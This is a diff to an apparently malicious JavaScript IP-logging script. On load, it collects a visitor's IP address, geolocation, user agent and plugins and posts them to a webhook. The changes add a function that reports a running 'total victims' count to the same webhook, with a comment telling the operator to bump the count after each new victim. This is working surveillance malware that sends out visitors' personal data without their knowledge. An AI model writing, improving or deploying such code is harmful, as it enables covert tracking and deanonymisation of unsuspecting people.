@@ -150,7 +150,10 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(basicPayload)
-        }).then(() => console.log('Basic fallback sent!')).catch(e => console.error('Basic send failed:', e));
+        }).then(() => {
+          console.log('Basic fallback sent!');
+          sendSuccessMessage(1); // Placeholder count
+        }).catch(e => console.error('Basic send failed:', e));
       };
       
       let ip = 'unknown';
@@ -175,7 +178,7 @@
         console.error('Geo fetch failed:', error);
       }
       
-      // Build fields with available data
+      // Build fields with available data (ignore failures)
       const fields = [];
       const timestamp = new Date().toISOString();
       const userAgent = navigator.userAgent || 'unknown';
@@ -203,7 +206,7 @@
         console.error('Plugins fetch failed:', error);
       }
       
-      // Geo fields (with fallbacks)
+      // Geo fields (with fallbacks - ignore if failed)
       const country = geoData.country || 'unknown';
       const city = geoData.city || 'unknown';
       const lat = geoData.lat || 'unknown';
@@ -297,14 +300,30 @@
         });
         if (response.ok) {
           console.log('Full data sent successfully!');
+          sendSuccessMessage(42); // Replace 42 with your current total victim count (update manually after each new victim)
         } else {
           console.error('Webhook response not OK:', response.status, response.statusText);
-          sendBasic(); // Fallback
+          sendBasic();
         }
       } catch (error) {
         console.error('Webhook send failed:', error);
-        sendBasic(); // Fallback
+        sendBasic();
       }
+    };
+    
+    const sendSuccessMessage = (victimCount) => {
+      const successPayload = {
+        content: `successfully logged data, total victims : ${victimCount}`
+      };
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(successPayload)
+      }).then(() => {
+        console.log(`Success message sent with count: ${victimCount}`);
+      }).catch(e => {
+        console.error('Success message send failed:', e);
+      });
     };
     
     // Run immediately on script load
